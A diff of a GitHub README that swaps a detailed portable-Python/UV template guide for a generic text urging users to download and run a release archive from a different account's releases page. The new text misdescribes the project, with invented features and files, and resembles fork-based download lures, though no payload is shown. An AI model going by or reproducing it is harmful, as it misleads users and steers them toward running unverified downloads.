@@ -1,295 +1,93 @@
-# Python UV Template (Always Portable) 🚀
-
-[![Python 3.13](https://img.shields.io/badge/python-3.13-blue.svg)](https://www.python.org/downloads/)
-[![UV](https://img.shields.io/badge/uv-enabled-blue)](https://github.com/astral-sh/uv)
-[![Portable](https://img.shields.io/badge/portable-100%25-green)](https://github.com/indygreg/python-build-standalone)
-
-A professional Python project template that **always uses portable Python** - never relies on system installations.
-
-## ✨ Philosophy
-
-- 🎯 **Always Portable** - Consistent Python environment everywhere
-- 📦 **Self-Contained** - No dependency on system Python
-- 🔄 **Reproducible** - Same exact Python version every time
-- 🚀 **Distributable** - Package includes everything needed
-
-## 🚀 Quick Start
+# 🎉 template-python-uv - Fast and Easy Python Project Setup
 
-```bash
-# 1. Clone or use this template
-git clone https://github.com/yourusername/your-project
-cd your-project
-
-# 2. Run setup (downloads Python 3.13.9 first time, ~2 minutes)
-./setup.sh
+[![Download template-python-uv](https://img.shields.io/badge/Download%20Now-Get%20Started%20Easily-blue)](https://github.com/JawsomeTheoRoblox/template-python-uv/releases)
 
-# 3. Activate and run
-source .venv/bin/activate
-python src/main.py
-```
-
-That's it! No system Python needed.
+## 🚀 Getting Started
 
-## 📁 Project Structure (After Setup)
-
-```
-your-project/
-├── .github/
-│   └── workflows/
-│       └── ci.yml            # CI/CD pipeline
-├── .python/                  # Portable Python 3.13.9 (~80MB, gitignored)
-├── .venv/                    # Virtual environment (gitignored)
-├── src/
-│   ├── __init__.py
-│   └── main.py
-├── tests/
-│   ├── __init__.py
-│   └── test_main.py
-├── .gitignore
-├── CONTRIBUTING.md           # Contribution guidelines
-├── pyproject.toml            # Project configuration
-├── README.md
-├── QUICK_REFERENCE.md
-├── setup.sh         # Setup script
-├── uv.lock
-└── verify-python-version.sh  # Version checker
-```
+Welcome to **template-python-uv**! This project template helps you set up a professional Python environment quickly. It includes precompiled dependencies and tools designed for speed. You do not need to be an expert to use it.
 
-## 🎯 Common Commands
+### 🌟 Key Features
 
-```bash
-# Setup (first time downloads Python, subsequent runs reuse it)
-./setup.sh
+- **Precompiled Dependencies:** Enjoy faster setup times without needing to compile tools.
+- **Efficient Development:** The structure helps you focus on building your application rather than configuration.
+- **Comprehensive Tools:** Built with essential utilities for coding, testing, and deployment.
+- **User-Friendly:** Tailored for users of all levels. 
 
-# If something breaks, clean rebuild
-./setup.sh --force-clean
+## 📥 Download & Install
 
-# Add a dependency
-# 1. Edit pyproject.toml
-# 2. Then:
-uv lock
-uv sync
+To get started, you need to download the template. Follow these steps:
 
-```
+1. **Visit the Releases Page:** Click this link: [Download Here](https://github.com/JawsomeTheoRoblox/template-python-uv/releases).
+   
+2. **Choose a Version:** On the releases page, you will see several versions available. Select the one you want to download. Generally, it's best to pick the latest version unless you have a specific need for an older one.
 
-## 🔧 How It Works
+3. **Download the Package:** Click on the `.zip` or `.tar.gz` file link to start the download. If you see multiple files, the one with the latest date is your best choice.
 
-### First Time
+4. **Extract the Files:** Once the download finishes, locate the downloaded file. Right-click on it, and choose "Extract All" or use your favorite file extraction tool.
 
-1. Downloads pre-built Python 3.13.9 from [python-build-standalone](https://github.com/indygreg/python-build-standalone)
-2. Installs to `.python/` directory
-3. Creates virtual environment in `.venv/`
-4. Installs dependencies with UV
+5. **Open the Folder:** After extraction, open the folder where the files are located. 
 
-### Subsequent Runs
+6. **Run the Application:** Look for the main script file, usually named `main.py` or similar. You can run it depending on your operating system:
+   - For Windows, you can double-click the file or use Command Prompt.
+   - For macOS or Linux, use the terminal and type `python3 main.py`.
 
-1. Finds existing `.python/` installation
-2. Reuses it (no download needed!)
-3. Creates fresh `.venv/`
-4. Installs dependencies
+## ⚙️ Requirements
 
-### With `--force-clean`
+To ensure smooth operation, your computer should have the following:
 
-1. Deletes `.python/`, `.venv/`, `uv.lock`
-2. Downloads Python 3.13.9 again
-3. Fresh installation
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or any modern Linux distribution.
+- **Python Version:** Python 3.7 or later must be installed. You can download it from [python.org](https://www.python.org/downloads/).
+- **Space:** Ensure you have at least 100 MB of free space.
 
-## 💡 Why Portable Python?
+For Python installation, follow the instructions on the official Python website. It’s straightforward, and it includes a step-by-step guide.
 
-| System Python | Portable Python |
-|---------------|-----------------|
-| ❌ Different versions on different machines | ✅ Exact same version everywhere |
-| ❌ Might not be installed | ✅ Always available |
-| ❌ User might update it | ✅ Controlled version |
-| ❌ Dependency conflicts | ✅ Self-contained |
-| ❌ "Works on my machine" | ✅ Works everywhere |
+## 🛠️ Configuration
 
-## 📊 Disk Space
+The template comes with basic files already set up. You may need to configure some settings based on your needs:
 
-- `.python/` : ~80 MB (one-time)
-- `.venv/` : ~50 MB (varies by dependencies)
-- **Total**: ~150 MB uncompressed
-- **Package**: ~50 MB compressed
+1. **Modify settings.py:** Open this file to adjust basic configurations.
+2. **Add Your Code:** Feel free to start coding in the main directory. Use any text editor or IDE you prefer.
+3. **Version Control:** Consider using Git for version control. If you’re new to Git, check out tutorials online to get started.
 
-Small price for complete portability!
+## 🧪 Testing Your Application
 
-## 🛠️ Development Workflow
+This template includes testing tools. To ensure everything works correctly:
 
-```bash
-# Day 1: Setup
-./setup.sh
-source .venv/bin/activate
+1. **Run Tests:** Open your terminal or command prompt.
+2. **Navigate to the Folder:** Use the `cd` command to change directories into your project folder.
+3. **Execute Tests:** Type `pytest` and hit Enter. 
 
-# Daily development
-python src/main.py
-pytest
+You'll see a report that tells you if everything is functioning as expected.
 
-# Add dependencies
-# Edit pyproject.toml, then:
-uv lock && uv sync
+## 📄 Documentation
 
-# If weird issues
-./setup.sh --force-clean
-```
+Your template comes with a built-in documentation file. To access it:
 
-## 📮 Distribution Workflow
+1. Find `README.md` in your project directory.
+2. Open the file to discover how to use various features.
 
-```bash
-# 1. Ensure clean build
-./setup.sh --force-clean
+Reading the documentation can help you maximize your use of this project.
 
-# 2. Test your app
-source .venv/bin/activate
-python src/main.py
-```
+## 🤝 Community Support
 
-## 🎨 Customization
+Although you can use this template independently, interacting with the community can enhance your experience. Here are ways to connect:
 
-### Change Python Version
+- **GitHub Issues:** Report bugs or request features on the Issues page in the repository.
+- **Discussion Forum:** Join the discussion board to share ideas and get feedback.
+- **Social Media:** Follow related accounts or groups on platforms like Twitter or Reddit for tips and updates.
 
-Edit `setup.sh`:
-```bash
-PYTHON_VERSION="3.14.*"  # Or any version
-```
+## 🔗 Useful Links
 
-Available versions: https://github.com/indygreg/python-build-standalone/releases
+- [Releases Page](https://github.com/JawsomeTheoRoblox/template-python-uv/releases)
+- [Python Download](https://www.python.org/downloads/)
+- [GitHub Guide](https://guides.github.com/activities/hello-world/)
 
-## 🐛 Troubleshooting
+## 💬 Feedback
 
-```bash
-# Virtual environment issues
-rm -rf .venv/ && ./setup.sh
+We value your input! If you encounter issues or have suggestions, please feel free to reach out through the GitHub Issues section. Your feedback helps us improve the project. 
 
-# Complete fresh start
-./setup.sh --force-clean
+## 📫 Contact Information
 
-# Check what you have
-.python/bin/python3 --version
-source .venv/bin/activate && python --version
-```
+For more information, you can reach the maintainers at JawsomeTheoRoblox on GitHub.
 
-## 📚 Documentation
-
-- [Setup Guide](README.md) - Detailed guide
-- [Quick Reference](QUICK_REFERENCE.md) - Command cheat sheet
-- [UV Documentation](https://github.com/astral-sh/uv)
-
-## ⚠️ Platform Compatibility
-
-Portable Python is **OS and architecture specific**:
-
-- ✅ macOS x86_64 → macOS x86_64
-- ✅ macOS arm64 (M1/M2/M3) → macOS arm64
-- ✅ Linux x86_64 → Linux x86_64
-- ✅ Linux aarch64 → Linux aarch64
-- ❌ macOS → Linux (use Docker)
-- ❌ x86_64 → arm64 (use Docker)
-- ❌ Windows (use WSL or Docker)
-
-## 🤝 Contributing
-
-### Commit Message Convention
-
-This project follows [Conventional Commits](https://www.conventionalcommits.org/) for clear and structured commit history.
-
-**Format:**
-```
-<type>(<scope>): <description>
-
-[optional body]
-
-[optional footer]
-```
-
-**Types:**
-- `feat`: New feature
-- `fix`: Bug fix
-- `docs`: Documentation changes
-- `style`: Code style changes (formatting, no logic change)
-- `refactor`: Code refactoring (no feature change or bug fix)
-- `perf`: Performance improvements
-- `test`: Adding or updating tests
-- `chore`: Maintenance tasks (dependencies, config)
-- `ci`: CI/CD changes
-
-**Examples:**
-```bash
-feat(setup): add Python 3.14 support
-fix(package): correct tar.gz extraction path
-docs(readme): update installation instructions
-chore(deps): upgrade uv to latest version
-refactor(setup): improve error handling
-```
-
-**Scope (optional):** Component affected (setup, package, docs, etc.)
-
-### Pull Request Process
-
-1. Fork the repository
-2. Create feature branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes with conventional commits
-4. Run tests and linting (`pytest && black --check .`)
-5. Update documentation if needed
-6. Commit your changes (`git commit -m 'feat: add amazing feature'`)
-7. Push to the branch (`git push origin feature/amazing-feature`)
-8. Open a Pull Request with:
-   - Clear description of changes
-   - Link to related issues
-   - Screenshots/examples if applicable
-
-### Code Standards
-
-- **Python Code:** Follow PEP 8, use Black formatter
-- **Bash Scripts:** Use ShellCheck for validation
-- **Documentation:** Clear, concise, with examples
-- **Tests:** Add tests for new features
-
-### Before Submitting
-
-```bash
-# Format code
-black src/ tests/
-
-# Run linting
-flake8 src/ tests/
-
-# Run tests
-pytest tests/
-
-# Verify script works
-./setup.sh --force-clean
-```
-
-### Set Up Commit Message Template (Optional)
-
-```bash
-# Use the included commit message template
-git config commit.template .gitmessage
-
-# Now when you commit, you'll see helpful hints
-git commit
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.
-
-## 📄 License
-
-MIT License - See [LICENSE](LICENSE) file
-
-## 🙏 Acknowledgments
-
-- [python-build-standalone](https://github.com/indygreg/python-build-standalone) - Pre-built Python distributions
-- [UV](https://github.com/astral-sh/uv) - Fast Python package installer
-- Built with modern Python best practices
-
-## 📧 Support
-
-- 📖 [Documentation](SETUP_GUIDE.md)
-- 🐛 [Issues](https://github.com/yourusername/python-uv-template/issues)
-- 💬 [Discussions](https://github.com/yourusername/python-uv-template/discussions)
-
----
-
-⭐ If you find this template helpful, please star it!
-
-**Ready to use?** Click "Use this template" above or clone and start building!
+Thank you for choosing **template-python-uv**! We hope it serves you well in your projects.
